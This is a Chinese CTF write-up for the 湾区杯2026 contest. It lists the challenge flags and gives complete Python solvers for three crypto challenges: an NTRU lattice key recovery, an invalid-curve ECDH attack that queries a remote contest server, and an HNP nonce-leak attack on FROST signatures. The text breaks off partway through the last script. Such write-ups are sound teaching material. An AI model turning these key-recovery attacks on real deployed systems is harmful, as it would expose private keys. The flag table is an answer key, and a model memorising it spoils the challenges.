---
title: 湾区杯2026 总体 WP
date: 2026-09-04
categories:
  - CTF
tags:
  - 湾区杯2026
  - misc
  - web
  - pwn
  - re
  - crypto
---

# 湾区杯2026 总体 WP

## 总览

共 21 个题目目录（其中 `pn-01;W`、`pn-03;C` 为空副本目录；`web-01` 下含 DockRelay、ShadowArchive 两道 Web 题），**20 题已解出并经真实远程/本地运行验证，1 题 partial（misc-05），2 题无 result（misc-02、re-01）**。

| # | 方向 | 题目 | 目录 | 状态 | Flag |
|---|------|------|------|------|------|
| 1 | crypto | TinyNTRU | crypto-01 | solved | `flag{27dec48f-f9c7-4bad-9a1b-f7aa77badc5f}` |
| 2 | crypto | Broken ECDH | cry-01 | solved | `flag{572a00d2-7d90-49a8-861a-3e3cea3aa14c}` |
| 3 | crypto | Cold Forge | crypto-02 | solved | `flag{bd9b026e-b58e-416c-bf8f-d815573c35a6}` |
| 4 | crypto | SlashKEM | crypto-03 | solved | `flag{708d7b97-0b8d-4d99-aa1a-b23d3b13cc51}` |
| 5 | crypto | mosaic_0rtt | crypto-04 | solved | `flag{0b7241b6-81f1-4e46-9480-0488f30131c0}` |
| 6 | pwn | logd | pn-01 | solved | `flag{75ceae2d-c40e-48c4-99c1-f8e0b1e30d97}` |
| 7 | pwn | knote (kernel) | pn-02 | solved | `flag{1ca07846-b372-4ee4-8d2f-22cdf114038c}` |
| 8 | pwn | gatewayd | pn-03 | solved | `flag{f06a36eb-e04f-462a-bac8-27b8210e4411}` |
| 9 | pwn | vault | pn-04 | solved | `flag{e9dd40a2-ce9d-4383-832b-234e75fde9fc}` |
| 10 | pwn | jit_sandbox | pwn-01 | solved | `flag{c3beac0d-a31a-49b6-9017-d1f6aa3d17e1}` |
| 11 | pwn | archivefs | pwn-02 | solved | `flag{2235ebfe-28ed-4ca7-bea2-2d01e37ee029}` |
| 12 | web | DockRelay | web-01 | solved | 11 |
| 13 | web | ShadowArchive | web-01 | solved | `flag{553702f8-5774-4624-bf90-a5994f6142af}` |
| 14 | reverse | rift_runner | rev-01 | solved | `flag{rift_runner_native_path_8613}` |
| 15 | reverse | meshgate | rev-02 | solved | `flag{d171a5f0-09f2-48d1-9b34-b82f6585a6c9}` |
| 16 | reverse | AttestJIT | reverse-01 | solved | `flag{f9f6752c-2a8e-45f3-aecb-cd8c12051627}` |
| 17 | reverse | Pixel Oracle | reverse-02 | solved | `flag{pix_oracle_moves_5279}` |
| 18 | misc/forensics | incident | misc-01 | solved | `flag{7fa4cb2d-5e9a-4d66-b8f1-3c9270ad51e4}` |
| 19 | misc/ai-ml | SilentWeights | misc-03 | solved | `flag{fd3a674e-8b2c-485a-b7d9-b1d703297007}` |
| 20 | misc | FractalTrace | misc-05 | **partial** | N/A（隐写结构已逆向，载荷疑似白化） |
| 21 | forensics | whoami | misc-02 | 无 result | N/A（2GB 内存镜像取证未完成） |
| 22 | reverse | passkey_vault | re-01 | 无 result | N/A（分析中途停止，无 result.md） |

各题完整攻击细节、验证命令与输出摘要在对应目录的 `result.md`；Web 题见 `web-01/[Web]DockRelay.md` 与 `web-01/[Web]ShadowArchive.md`。以下按方向分题总结。

---

## Crypto

### 1. TinyNTRU（crypto-01）

#### Summary

NTRU-like 加密（N=127, q=12289, p=3）参数偏弱，构造 2N×2N 格 `[I|C; 0|qI]` 用 LLL+BKZ 恢复私钥短向量 (f,g)（norm²=127），逐候选解密两段密文得 flag。

#### Solution

- 目标向量 f=1+3F、g=3G，norm²=127，远高于高斯启发值可达范围 → 纯 LLL（254 维）只能压到 norm²≈1.4e4，不够。
- 改用 **LLL 预归约 + BKZ block_size=25**（fpylll，约 68s）稳定返回多条 norm²=127 的行。
- 逐行取 f0=row[:N]，对 norm²<4000 的行做 ±符号 × N 旋转候选，分别解密两段密文：`a=e·f mod q` 中心化后 mod 3 得三进制消息块，按 24B/chunk 转回字节并校验长度前缀 → 命中 flag。

#### Flag

```
flag{27dec48f-f9c7-4bad-9a1b-f7aa77badc5f}
```

#### 工具与版本

- Docker 镜像 `ntru-solver`（python:3.12-slim + fpylll 0.6.4），`docker run --rm -v ...:/work ntru-solver python solve.py` 一键复跑。

#### 完整脚本

`crypto-01/solve.py`：

```python
#!/usr/bin/env python3
"""
TinyNTRU solver.

Recover private polynomial f (up to rotation/sign) from public key h via the
NTRU lattice L_h = { (a, b) : a*h == b (mod q) }, then decrypt ciphertexts.

N=127: plain LLL stalls around norm^2 ~13k, so we finish with BKZ (block 25),
which returns the planted (f,g) vectors (norm^2 = 127).  We scan every reduced
row with small norm, and try all N rotations x both signs for decryption; the
flag appears under the exact (f, m) alignment.

Run inside ntru-solver image (has fpylll):
  docker run --rm -v <dir>:/work -w /work --entrypoint python ntru-solver solve.py
"""
from __future__ import annotations

import pathlib
import sys
import time

from fpylll import IntegerMatrix, LLL, BKZ

BASE = pathlib.Path(__file__).resolve().parent


# ---------------------------------------------------------------- load data
def load():
    pk_ns: dict = {}
    exec((BASE / "public_key.txt").read_text(encoding="utf-8"), pk_ns)  # noqa: S102
    out_ns: dict = {}
    exec((BASE / "output.txt").read_text(encoding="utf-8"), out_ns)  # noqa: S102
    N = int(pk_ns["N"])
    p = int(pk_ns["p"])
    q = int(pk_ns["q"])
    h = list(pk_ns["h"])
    cts = [list(c) for c in out_ns["ciphertexts"]]
    assert len(h) == N
    return N, p, q, h, cts


# --------------------------------------------------------------- ring helpers
def poly_mul(a: list[int], b: list[int], n: int, mod: int | None = None) -> list[int]:
    out = [0] * n
    for i, ai in enumerate(a):
        if ai:
            for j, bj in enumerate(b):
                if bj:
                    out[(i + j) % n] += ai * bj
    if mod is not None:
        out = [x % mod for x in out]
    return out


def center(x: int, q: int) -> int:
    x %= q
    if x > q // 2:
        x -= q
    return x


def decrypt_block(ct: list[int], f: list[int], n: int, p: int, q: int) -> list[int]:
    lifted = [center(x, q) for x in poly_mul(f, ct, n, q)]
    return [x % p for x in lifted]


def trits_to_bytes(blocks: list[list[int]], chunk_bytes: int) -> bytes:
    raw = bytearray()
    for blk in blocks:
        value = 0
        for coeff in reversed(blk):
            value = value * 3 + (coeff % 3)
        raw.extend(value.to_bytes(chunk_bytes, "little"))
    size = int.from_bytes(raw[:2], "big")
    return bytes(raw[2 : 2 + size])


def rotations(poly: list[int]) -> list[list[int]]:
    return [poly[t:] + poly[:t] for t in range(len(poly))]


# ------------------------------------------------------------ lattice attack
def ntru_lattice(h: list[int], q: int, n: int):
    dim = 2 * n
    B = IntegerMatrix(dim, dim)
    for i in range(n):
        B[i, i] = 1
        for j in range(n):
            B[i, n + j] = h[(j - i) % n]
    for j in range(n):
        B[n + j, n + j] = q
    LLL.reduction(B)
    BKZ.reduction(B, BKZ.Param(block_size=25))
    rows = [[B[r][c] for c in range(dim)] for r in range(dim)]
    rows.sort(key=lambda r: sum(x * x for x in r))
    return rows


def main() -> int:
    N, p, q, h, cts = load()
    chunk_bytes = 24
    print(f"N={N} p={p} q={q}  blocks={len(cts)}", flush=True)

    t0 = time.time()
    rows = ntru_lattice(h, q, N)
    print(f"LLL+BKZ done in {time.time() - t0:.1f}s", flush=True)

    tried = 0
    for row in rows:
        f0 = row[:N]
        g0 = row[N:]
        nf = sum(x * x for x in f0)
        ng = sum(x * x for x in g0)
        if nf + ng > 4000:
            continue
        # sanity: the lattice condition must hold exactly for the found vector
        assert all((g0[j] - sum(f0[i] * h[(j - i) % N] for i in range(N))) % q == 0
                   for j in range(N)), "row not in lattice?!"
        for sign in (1, -1):
            f_base = [sign * x for x in f0]
            for cand in rotations(f_base):
                tried += 1
                try:
                    msgs = [decrypt_block(c, cand, N, p, q) for c in cts]
                    data = trits_to_bytes(msgs, chunk_bytes)
                except Exception:
                    continue
                if data.startswith(b"flag{") and data.endswith(b"}"):
                    print("FOUND:", data.decode(errors="replace"))
                    return 0
    print("no flag found; tried", tried)
    return 1


if __name__ == "__main__":
    sys.exit(main())
```


---

### 2. Broken ECDH（cry-01）

#### Summary

服务端 Oracle.query 不校验点是否在曲线上（且群运算公式只依赖 a=0），p≡2 mod 3 使扭曲曲线 y²=x³+b' 超奇异、阶 p+1。经典 **invalid curve attack**：16 次查询逐小因子恢复 d，CRT 拼出完整私钥后解密真实 flag。

#### Solution

- 对每个小因子 ℓ ∈ {4,5,7,...,59}（舍 3），构造不在原曲线上、阶为 ℓ 的无效点送 oracle。
- 用已知明文 `b"Invalid curve attacks are real."` 试解 AES-CBC 密钥候选，得 d mod ℓ。
- CRT（模 71 bit 积）恢复 `d = 387180059029016236`，`(d mod q)*G == Q` 验证通过。
- 算 shared = d·B_pub，AES-CBC 解密服务端 banner 中的真实 flag_iv/flag_ct。

#### Flag

```
flag{572a00d2-7d90-49a8-861a-3e3cea3aa14c}
```

#### 工具与版本

- 宿主 python 3.12 + pycryptodome + socket（一次连接 16 查询内完成），`solve_remote.py` 打 39.107.89.179:20713。

#### 完整脚本

`cry-01/solve_remote.py`：

```python
"""Broken ECDH - invalid curve attack against the REAL remote server.

Protocol (from server.py main()):
  banner: "Welcome to Broken ECDH." + render_public_output(flag_iv, flag_ct)
          + "You have 16 oracle queries." + "Send your peer public key as: x y"
  then 16 rounds: we send "x y\n", server replies either
          "iv = <hex>\n" + "ct = <hex>\n"   or   "invalid\n"
  all inside ONE connection (query budget is per-connection).

Attack: identical to solve.py (local sim, verified 3x). For each small factor
ell (16 factors, dropping 3), build a point of order ell on a supersingular
twist y^2 = x^3 + b', send it, trial-decrypt the AES-CBC known-plaintext blob
with keys from k*P_ell to get d mod ell, CRT recover d, verify
(d mod q)*G == public Q, then shared = d*B_pub decrypts flag_ct.

Run:  python solve_remote.py
"""

import re
import socket
import random
from hashlib import sha256

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

from ecc import Curve, Point, InvalidPoint, int_to_bytes
import params

HOST, PORT = "39.107.89.179", 20713
TIMEOUT = 30

P_MOD = params.P
ORDER = params.ORDER
KNOWN = params.KNOWN_PLAINTEXT
CURVE = Curve(P_MOD, params.A, params.B)


def derive_key(Pt):
    if Pt.is_infinity():
        raise InvalidPoint("infinity shared secret")
    return sha256(int_to_bytes(Pt.x) + int_to_bytes(Pt.y)).digest()


class RemoteOracle:
    def __init__(self, host, port, timeout=TIMEOUT):
        socket.setdefaulttimeout(timeout)
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.f = self.sock.makefile("r", encoding="utf-8", newline="\n")
        # read banner until the prompt line
        self.banner = []
        while True:
            line = self.f.readline()
            if not line:
                raise RuntimeError("server closed connection during banner")
            self.banner.append(line.rstrip("\n"))
            if line.startswith("Send your peer public key"):
                break
        text = "\n".join(self.banner)
        m_iv = re.search(r"flag_iv = ([0-9a-f]+)", text)
        m_ct = re.search(r"flag_ct = ([0-9a-f]+)", text)
        if not (m_iv and m_ct):
            raise RuntimeError("no flag_iv/flag_ct in banner:\n" + text)
        self.flag_iv = bytes.fromhex(m_iv.group(1))
        self.flag_ct = bytes.fromhex(m_ct.group(1))
        self.used = 0

    def query(self, x, y):
        self.sock.sendall(f"{x} {y}\n".encode())
        line1 = self.f.readline()
        if not line1:
            raise RuntimeError("server closed connection on query")
        line1 = line1.strip()
        if line1 == "invalid":
            return None
        m1 = re.fullmatch(r"iv = ([0-9a-f]+)", line1)
        line2 = self.f.readline().strip()
        m2 = re.fullmatch(r"ct = ([0-9a-f]+)", line2)
        if not (m1 and m2):
            raise RuntimeError(f"unexpected response: {line1!r} / {line2!r}")
        self.used += 1
        return bytes.fromhex(m1.group(1)), bytes.fromhex(m2.group(1))

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def find_point_of_order(ell):
    """Point of exact order ell on a twist y^2 = x^3 + b' (a = 0)."""
    cof = ORDER // ell
    while True:
        b_twist = random.randrange(1, P_MOD)
        x = random.randrange(0, P_MOD)
        rhs = (pow(x, 3, P_MOD) + b_twist) % P_MOD
        y = pow(rhs, (P_MOD + 1) // 4, P_MOD)  # p % 4 == 3
        if (y * y) % P_MOD != rhs:
            continue
        R = Point(x, y)
        P = CURVE.mul(cof, R)  # group law only depends on a=0 -> same on server
        if P.is_infinity():
            continue
        if not CURVE.mul(ell, P).is_infinity():
            continue
        if ell == 4 and CURVE.mul(2, P).is_infinity():
            continue
        return P


def recover_residue(oracle, ell):
    P_ell = find_point_of_order(ell)
    resp = oracle.query(P_ell.x, P_ell.y)
    if resp is None:
        # "invalid" -> infinity shared secret -> d == 0 (mod ell)
        return 0
    iv, ct = resp
    acc = Point()  # infinity
    for k in range(1, ell):
        acc = CURVE.add(acc, P_ell)
        key = sha256(int_to_bytes(acc.x) + int_to_bytes(acc.y)).digest()
        try:
            pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)
        except ValueError:
            continue
        if pt == KNOWN:
            return k
    raise RuntimeError(f"no residue found mod {ell}")


def crt(residues, moduli):
    x, M = 0, 1
    for r, m in zip(residues, moduli):
        t = ((r - x) % m) * pow(M % m, -1, m) % m
        x += M * t
        M *= m
    return x, M


def main():
    random.seed()
    oracle = RemoteOracle(HOST, PORT)
    print("[*] banner received; flag_iv =", oracle.flag_iv.hex())
    print("[*] flag_ct =", oracle.flag_ct.hex())

    factors = [f for f in params.SMALL_FACTORS if f != 3]
    assert len(factors) == params.MAX_QUERIES

    residues = []
    for ell in factors:
        r = recover_residue(oracle, ell)
        residues.append(r)
        print(f"[+] query {oracle.used:>2}/16  mod {ell:>2}: d == {r}")
    oracle.close()

    d_rec, M = crt(residues, factors)
    print(f"[*] CRT modulus M = {M} ({M.bit_length()} bits) > q = {params.Q}")
    print(f"[*] recovered d candidate = {d_rec}")

    # verify against the published Q = d*G (ord(G) = q)
    G = Point(params.GX, params.GY)
    Q_pub = Point(params.QX, params.QY)
    d_mod_q = d_rec % params.Q
    ok_pub = CURVE.mul(d_mod_q, G) == Q_pub
    print(f"[*] (d_rec mod q)*G == published Q: {ok_pub}")
    if not ok_pub:
        raise RuntimeError("recovered d does not match published Q; need 59-bit DLOG fallback")

    shared = CURVE.mul(d_mod_q, Point(params.PEER_X, params.PEER_Y))
    key = derive_key(shared)
    pt = unpad(AES.new(key, AES.MODE_CBC, oracle.flag_iv).decrypt(oracle.flag_ct), 16)
    print(f"[+] decrypted flag: {pt!r}")
    print("[+] FULL CHAIN VERIFIED AGAINST REAL REMOTE")


if __name__ == "__main__":
    main()
```


---

### 3. Cold Forge（crypto-02）

#### Summary

FROST-2/Secp256k1 门限签名遥测泄露有效 nonce 高 152 位（丢 104 低位 + ±1 抖动）→ LLL+Babai 解 **HNP/CVP** 恢复两个 signer 份额 → 组密钥伪造 BIP340 确定性签名解封 sealed_release。

#### Solution

- 每个 signer 20 条 transcript，量化 nonce 观测构造 HNP；容器内 fpylll 无 wheel，自写纯 Python LLL + **400bit 高精度 mpmath Babai**（double 精度会因 2^260 量级浮点抵消失败）。
- s = 2·s1 − s2 mod n，校验 s·G == group_public。
- BIP340 规范精确实现（aux = 32 个 0）对 message_hex 原文签名；曾漏 aux XOR 的 t 推导与多种 aux/k 变体均过不了 Poly1305 tag，最终命中 `msg-raw | bip340(aux0)`。
- KDF = SHA256('cold-forge/release/v1'||sig) 作 ChaCha20-Poly1305 key 解密。

#### Flag

```
flag{bd9b026e-b58e-416c-bf8f-d815573c35a6}
```

#### 工具与版本

- Docker python:3.12-slim + pycryptodome + mpmath；`docker exec crypto02 python solve.py` 复跑。

#### 完整脚本

`crypto-02/solve.py`：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cold Forge (crypto-02) solver.

Attack plan
-----------
1. FROST-2 (secp256k1, threshold 2, participants {1,2}, lagrange lambda1=2, lambda2=-1).
   Each transcript holds one signer's response z_i = k_i + c_i * lambda_i * s_i (mod n)
   where k_i = d_i + rho_i*e_i is the "effective nonce", and the leak model gives the
   top 152 bits of k_i (bucket = floor(k_i / 2^104), with up to +/-1 bucket drift).
2. For each signer separately (20 transcripts each) run an HNP lattice (CVP via
   LLL + Babai nearest plane) to recover that signer's secret share s_i.
3. Group secret  s = 2*s1 - s2 (mod n)   [interpolation at x=0 through f(1)=s1, f(2)=s2]
   verify s*G == group_public.
4. Produce deterministic BIP340 signature over the release message with key s, try a
   small set of deterministic nonce derivations, derive ChaCha20-Poly1305 key
   KDF = SHA256('cold-forge/release/v1' || bip340_signature) and decrypt; Poly1305 tag
   selects the right candidate.
"""
import json, os, sys, hashlib, itertools, base64, struct, time

# ----------------------------------------------------------------- secp256k1
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

def inv(a, m):
    return pow(a, -1, m)

def ec_add(p1, p2):
    if p1 is None: return p2
    if p2 is None: return p1
    x1, y1 = p1; x2, y2 = p2
    if x1 == x2:
        if (y1 + y2) % P == 0: return None
        lam = (3 * x1 * x1) * inv(2 * y1, P) % P
    else:
        lam = (y2 - y1) * inv(x2 - x1, P) % P
    x3 = (lam * lam - x1 - x2) % P
    y3 = (lam * (x1 - x3) - y1) % P
    return (x3, y3)

def ec_mul(k, pt):
    k %= N
    r = None
    while k:
        if k & 1: r = ec_add(r, pt)
        pt = ec_add(pt, pt)
        k >>= 1
    return r

G = (Gx, Gy)

# ------------------------------------------------------------ telemetry load
def load_telemetry(path):
    with open(path, encoding='utf-8') as f:
        return json.load(f)

# ------------------------------------------------------------ HNP (pure py LLL + Babai)
def dot(a, b): return sum(x * y for x, y in zip(a, b))

def vec_sub(a, b): return [x - y for x, y in zip(a, b)]

def vec_scale(a, s): return [x * s for x in a]

def lll_reduce(rows, delta=0.75):
    """Exact (integer) LLL reduction. rows: list of integer row vectors (basis).
    Returns reduced basis (list of integer lists).  Fraction-free integer version."""
    n = len(rows)
    dim = len(rows[0])
    b = [list(map(int, r)) for r in rows]
    # Gram-Schmidt coefficients computed in floats at each step (standard LLL)
    def gso(basis):
        mu = [[0.0] * n for _ in range(n)]
        Bn = [0.0] * n
        v = [list(map(float, x)) for x in basis]
        for i in range(n):
            for j in range(i):
                mu[i][j] = (dot(basis[i], v[j]) / Bn[j]) if Bn[j] != 0 else 0.0
                v[i] = [v[i][k] - mu[i][j] * v[j][k] for k in range(dim)]
            Bn[i] = dot(v[i], v[i])
        return mu, Bn
    mu, Bn = gso(b)
    k = 1
    cnt = 0
    while k < n:
        cnt += 1
        if cnt > 200000:
            raise RuntimeError('LLL did not converge')
        # size reduce b[k] against b[k-1..0]
        for j in range(k - 1, -1, -1):
            if abs(mu[k][j]) > 0.5:
                q = round(mu[k][j])
                b[k] = [b[k][i] - q * b[j][i] for i in range(dim)]
                for c in range(j):
                    mu[k][c] -= q * mu[j][c]
                mu[k][j] -= q
        # Lovasz condition
        if Bn[k] >= (delta - mu[k][k - 1] ** 2) * Bn[k - 1]:
            k += 1
        else:
            b[k], b[k - 1] = b[k - 1], b[k]
            # update mu, Bn incrementally (simplify: full recompute)
            mu, Bn = gso(b)
            k = max(k - 1, 1)
    return b

def gso_recompute(basis):
    n = len(basis)
    dim = len(basis[0])
    # floating Gram-Schmidt
    Bn = []
    mu = []
    bstar = []
    for i in range(n):
        vi = list(map(float, basis[i]))
        mui = []
        for j in range(i):
            m = dot(basis[i], bstar[j]) / Bn[j] if Bn[j] else 0.0
            mui.append(m)
            vi = [vi[k] - m * bstar[j][k] for k in range(dim)]
        mu.append(mui)
        bstar.append(vi)
        Bn.append(dot(vi, vi))
    return mu, Bn, bstar

def babai_nearest_plane(red_basis, target, prec=400):
    """Babai nearest plane computed in high-precision mpmath to avoid float
    cancellation (operands ~2^260, wanted residual ~2^105 needs >200 bits).
    red_basis: LLL-reduced integer basis. target: integer vector.
    Returns lattice point p (list of ints)."""
    from mpmath import mp, mpf
    mp.prec = prec
    n = len(red_basis)
    dim = len(target)
    b = [[mpf(v) for v in row] for row in red_basis]
    t = [mpf(v) for v in target]
    # GSO in high precision
    bstar = []
    Bn = []
    for i in range(n):
        vi = list(b[i])
        for j in range(i):
            mui = (sum(vi[k] * bstar[j][k] for k in range(dim)) / Bn[j]) if Bn[j] != 0 else mpf(0)
            vi = [vi[k] - mui * bstar[j][k] for k in range(dim)]
        bstar.append(vi)
        Bn.append(sum(x * x for x in vi))
    w = list(t)
    for i in range(n - 1, -1, -1):
        if Bn[i] == 0:
            continue
        num = sum(w[k] * bstar[i][k] for k in range(dim))
        ci = mp.nint(num / Bn[i])
        w = [w[k] - ci * b[i][k] for k in range(dim)]
    p = [int(target[k]) - int(mp.nint(w[k])) for k in range(dim)]
    return p

def hnp_solve_share(modulus, tlist, dlist, special=None):
    """Solve  delta_i = (d_i - t_i * x) mod n, delta_i in [0, B) small
    for x.  Returns (x, delta_ints) or None.
    CVP formulation in lattice L = {v : v_i ≡ t_i*x (mod n)}  =  nZ^m + Z·t.
    Basis: {n e_i : i != special} ∪ r, r_i = (t_i * t_special^{-1}) mod n (i!=special), r_special=1.
    """
    m = len(tlist)
    n = modulus
    # special coordinate
    if special is None:
        special = m - 1
    ts = tlist[special]
    if inv(ts, n) == 0:
        raise ValueError('special coordinate not invertible')
    tinv = inv(ts, n)
    # build m x m basis (with coordinate 'special' last after reorder)
    order = [i for i in range(m) if i != special] + [special]
    # basis rows (length m, columns follow `order`)
    rows = []
    for idx in range(m - 1):
        r = [0] * m
        r[idx] = n
        rows.append(r)
    r = []
    for j in range(m - 1):
        r.append((tlist[order[j]] * tinv) % n)
    r.append(1)
    rows.append(r)
    # target d in same coordinate order
    tgt = [dlist[i] for i in order]
    tarr = [tlist[i] for i in order]
    t0 = tarr[0]
    t0inv = inv(t0, n)
    red = lll_reduce(rows)
    p = babai_nearest_plane(red, tgt)
    x = (p[0] * t0inv) % n
    # verify
    ok = True
    deltas = []
    for i in range(m):
        di = (tgt[i] - (tarr[i] * x) % n) % n
        deltas.append(di)
        if di >= 1 << 106:  # loose sanity (true bound < 3*2^104)
            ok = False
    return (x, deltas) if ok else None

# ------------------------------------------------------------ solve shares
DISCARD = 104   # discarded low bits

def solve_signer(transcripts, lamb, n):
    """transcripts: list of dicts for one signer. Return secret share x."""
    rows = []
    for tr in transcripts:
        c = int(tr['challenge'], 16)
        z = int(tr['z'], 16)
        obs = int(tr['nonce_msb'], 16)
        t = (c * lamb) % n
        # assume true bucket in {obs-1, obs, obs+1} -> delta in [0, 3*2^104)
        u = (obs - 1) * (1 << DISCARD)
        d = (z - u) % n
        rows.append((t, d, obs))
    m = len(rows)
    tlist = [r[0] for r in rows]
    dlist = [r[1] for r in rows]
    obslist = [r[2] for r in rows]
    # try several special-coordinate choices (invertible needed)
    cands = []
    for special in range(m):
        if inv(tlist[special], n) == 1:  # gcd==1
            pass
    for special in range(m):
        if tlist[special] == 0:
            continue
        try:
            res = hnp_solve_share(n, tlist, dlist, special)
        except Exception:
            continue
        if res is None:
            continue
        x, deltas = res
        # strict verify: bucket drift <= 1 for every transcript
        if verify_share(x, rows):
            return x
        cands.append((x, sum(deltas)))
    # fall back to loosest candidate
    if cands:
        cands.sort(key=lambda e: e[1])
        x = cands[0][0]
        if verify_share(x, rows):
            return x
    return None

def verify_share(x, rows):
    for (t, d, obs) in rows:
        delta = (d - t * x) % N
        # delta in [0,3*2^104) <=> bucket = obs-1 + floor(delta/2^104) in {obs-1,obs,obs+1}
        bucket = (obs - 1) + (delta >> DISCARD)
        if abs(bucket - obs) > 1:
            return False
    return True

# ------------------------------------------------------------ BIP340
def bytes_from_int(x, nbytes=32):
    return x.to_bytes(nbytes, 'big')

def tagged_hash(tag, data):
    th = hashlib.sha256(tag.encode()).digest()
    return hashlib.sha256(th + th + data).digest()

def lift_x(x):
    if x >= P:
        return None
    y2 = (pow(x, 3, P) + 7) % P
    y = pow(y2, (P + 1) // 4, P)
    if y * y % P != y2:
        return None
    return (x, y if y % 2 == 0 else P - y)

def has_even_y(pt):
    return pt[1] % 2 == 0

def xonly(P):
    return bytes_from_int(P[0])

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def bip340_sign(msg, seckey_int, aux_rand=None):
    """BIP-340 Schnorr sign, spec-exact (x-only points, aux XOR nonce seed)."""
    if aux_rand is None:
        aux_rand = b'\x00' * 32
    if len(aux_rand) != 32:
        aux_rand = hashlib.sha256(aux_rand).digest()
    d0 = seckey_int % N
    P = ec_mul(d0, G)
    d = d0 if has_even_y(P) else (N - d0) % N
    P = ec_mul(d, G)
    t = xor_bytes(bytes_from_int(d), tagged_hash('BIP0340/aux', aux_rand))
    k0 = int.from_bytes(tagged_hash('BIP0340/nonce', t + xonly(P) + msg), 'big') % N
    if k0 == 0:
        raise ValueError('k0 zero')
    R = ec_mul(k0, G)
    k = (N - k0) % N if not has_even_y(R) else k0
    R = ec_mul(k, G)
    e = int.from_bytes(tagged_hash('BIP0340/challenge', xonly(R) + xonly(P) + msg), 'big') % N
    sig = xonly(R) + bytes_from_int((k + e * d) % N)
    return sig, P

def bip340_sign_rfc6979(msg, seckey_int, even_key=True):
    """BIP-340-frame Schnorr but with RFC6979 deterministic nonce (variants)."""
    d0 = seckey_int % N
    P = ec_mul(d0, G)
    d = d0 if has_even_y(P) else (N - d0) % N
    P = ec_mul(d, G)
    kseed = d if even_key else d0
    k0 = rfc6979_k(kseed, msg)
    R = ec_mul(k0, G)
    k = (N - k0) % N if not has_even_y(R) else k0
    R = ec_mul(k, G)
    e = int.from_bytes(tagged_hash('BIP0340/challenge', xonly(R) + xonly(P) + msg), 'big') % N
    sig = xonly(R) + bytes_from_int((k + e * d) % N)
    return sig, P

def bip340_selftest():
    """BIP-340 test vector 0."""
    seckey = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000003')
    aux = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')
    msg = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')
    want = 'E907831F80848D1069A5371B402410364BDF1C5F8307B0084C55F1CE2DCA821525F66A4A85EA8B71E482A74F382D2CE5EBEEE8FDB2172F477DF4900D310536C0'
    sig, _ = bip340_sign(msg, int.from_bytes(seckey, 'big'), aux)
    return sig.hex().upper() == want

# RFC6979 for secp256k1 (SHA-256) -> deterministic scalar k
def rfc6979_k(skey_int, msg, n=N):
    def bits2int(b):
        z = int.from_bytes(b, 'big')
        blen = len(b) * 8
        if blen > n.bit_length():
            z >>= (blen - n.bit_length())
        return z
    def int2octets(x):
        return bytes_from_int(x, (n.bit_length() + 7) // 8)
    def bits2octets(b):
        z1 = bits2int(b)
        z2 = z1 - n if z1 >= n else z1
        return int2octets(z2)
    h1 = hashlib.sha256(msg).digest()
    x = int2octets(skey_int % n)
    V = b'\x01' * 32
    K = b'\x00' * 32
    K = hashlib.sha256(K + b'\x00' + x + bits2octets(h1)).digest()
    V = hashlib.sha256(V).digest()
    K = hashlib.sha256(K + b'\x01' + V + x + bits2octets(h1)).digest()
    V = hashlib.sha256(V).digest()
    while True:
        V = hashlib.sha256(V).digest()
        k = bits2int(V)
        if 1 <= k < n:
            return k
        K = hashlib.sha256(K + b'\x00' + V).digest()
        V = hashlib.sha256(V).digest()

# ------------------------------------------------------------ KDF / AEAD
def try_decrypt(key, nonce, aad, ct, tag):
    from Crypto.Cipher import ChaCha20_Poly1305
    try:
        c = ChaCha20_Poly1305.new(key=key, nonce=nonce)
        c.update(aad)
        pt = c.decrypt_and_verify(ct, tag)
        return pt
    except Exception:
        return None

if __name__ == '__main__':
    base = os.path.dirname(os.path.abspath(__file__))
    # attach dirs
    data_candidates = [
        base,  # attachments copied here at solve time
        os.path.join(base, '..', '..', 'CRYPOTO', 'cold_forge'),
        os.path.join(base, 'attachments'),
    ]
    data_dir = None
    for cand in data_candidates:
        if os.path.isdir(cand) and os.path.isfile(os.path.join(cand, 'frost_telemetry.json')):
            data_dir = cand
            break
    if data_dir is None:
        # allow env/argv override
        for p in (os.environ.get('COLD_FORGE_DATA'),):
            if p and os.path.isfile(os.path.join(p, 'frost_telemetry.json')):
                data_dir = p
    if data_dir is None:
        print('cannot find data dir', file=sys.stderr)
        sys.exit(2)
    t0 = time.time()
    tel = load_telemetry(os.path.join(data_dir, 'frost_telemetry.json'))
    sealed = load_telemetry(os.path.join(data_dir, 'sealed_release.json'))
    n = int(tel['group_order'], 16)
    lam = {int(k): int(v, 16) % n for k, v in tel['lagrange_coefficients'].items()}
    Y = (int(tel['group_public']['x'], 16), int(tel['group_public']['y'], 16))
    msg = bytes.fromhex(tel['message_hex'])
    trs = tel['transcripts']
    by_signer = {}
    for t in trs:
        by_signer.setdefault(int(t['signer']), []).append(t)
    print('transcripts per signer:', {k: len(v) for k, v in by_signer.items()})
    shares = {}
    for signer, ts_ in by_signer.items():
        x = solve_signer(ts_, lam[signer], n)
        if x is None:
            print(f'FAILED to recover share for signer {signer}')
            sys.exit(3)
        shares[signer] = x
        print(f'signer {signer} share recovered: {x:064x}')

    s = (shares[1] * lam[1] + shares[2] * lam[2]) % n
    print('group secret s =', hex(s))
    Spt = ec_mul(s, G)
    print('s*G =', (hex(Spt[0]), hex(Spt[1])))
    print('Y   =', (hex(Y[0]), hex(Y[1])))
    if Spt != Y:
        print('WARNING: s*G != group_public')
    else:
        print('OK: s*G == group_public')

    # ---- build candidate signatures (deterministic) and try each for decrypt
    print('BIP340 self-test pass:', bip340_selftest())
    nonce_bytes = base64.b64decode(sealed['nonce'])
    aad = base64.b64decode(sealed['aad'])
    ct_full = base64.b64decode(sealed['ciphertext'])
    ct, tag = ct_full[:-16], ct_full[-16:]
